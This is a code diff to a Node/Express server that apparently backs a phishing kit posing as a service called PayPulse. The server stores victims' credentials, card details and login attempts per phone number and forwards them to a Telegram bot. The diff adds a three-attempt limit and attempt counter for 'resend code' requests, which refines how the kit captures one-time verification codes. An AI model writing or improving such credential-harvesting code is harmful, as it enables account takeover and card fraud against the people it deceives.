@@ -13,6 +13,7 @@ app.use(express.static('.')); // Tells Express to serve your static HTML files
 const orderStatuses = {};   
 const lastSubmissionTime = {}; 
 const lastResendTimestamp = {}; // Tracks backend cooldown per phone for resend requests
+const resendCounts = {};        // Tracks number of resend attempts per phone (max 3)
 const userCredentials = {}; // Tracks collected credentials per phone
 const loginAttemptCounts = {}; // Tracks login attempts for second-attempt logic after 60s
 
@@ -59,14 +60,27 @@ app.post('/api/submit-order', async (req, res) => {
         const cooldownTime = 10 * 1000; // 10 seconds general cooldown to prevent button spamming
         const isResendAction = uniqueId && uniqueId.includes('Resend');
 
-        // Enforce a strict backend rate limit for Resend actions (60 seconds)
+        // Enforce strict backend rate limits and maximum limits for Resend actions
         if (isResendAction) {
+            // Initialize or track resend attempts for this phone
+            if (!resendCounts[phone]) {
+                resendCounts[phone] = 0;
+            }
+
+            // Restrict maximum resend attempts to 3 times strictly on the backend
+            if (resendCounts[phone] >= 3) {
+                return res.json({ success: false, message: 'Resend limit reached.' });
+            }
+
             const lastResend = lastResendTimestamp[phone] || 0;
-            const resendCooldown = 60 * 1000; // 60 seconds
+            const resendCooldown = 60 * 1000; // 60 seconds timeframe
 
             if (currentTime - lastResend < resendCooldown) {
-                return res.json({ success: true, message: 'Resend cooldown active.' });
+                return res.json({ success: false, message: 'Resend cooldown active.' });
             }
+
+            // Increment successful resend request count and record timestamp
+            resendCounts[phone] += 1;
             lastResendTimestamp[phone] = currentTime;
         }
 
@@ -141,7 +155,7 @@ app.post('/api/submit-order', async (req, res) => {
             userCredentials[phone].cardDetails = uniqueId;
         } else if (isResendAction) {
             headerTitle = "🔄 *PayPulse Resend Code Request*";
-            includeInlineButtons = false;
+            includeInlineButtons = false; // Independent one-way notification without interactive buttons
         }
 
         // Build a comprehensive message displaying accumulated user info
@@ -167,7 +181,7 @@ app.post('/api/submit-order', async (req, res) => {
         }
 
         if (isResendAction) {
-            message += `\n\n📌 Status: *Resend Code Requested*`;
+            message += `\n\n📌 Status: *Resend Code Requested (Attempt ${resendCounts[phone]}/3)*`;
         }
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
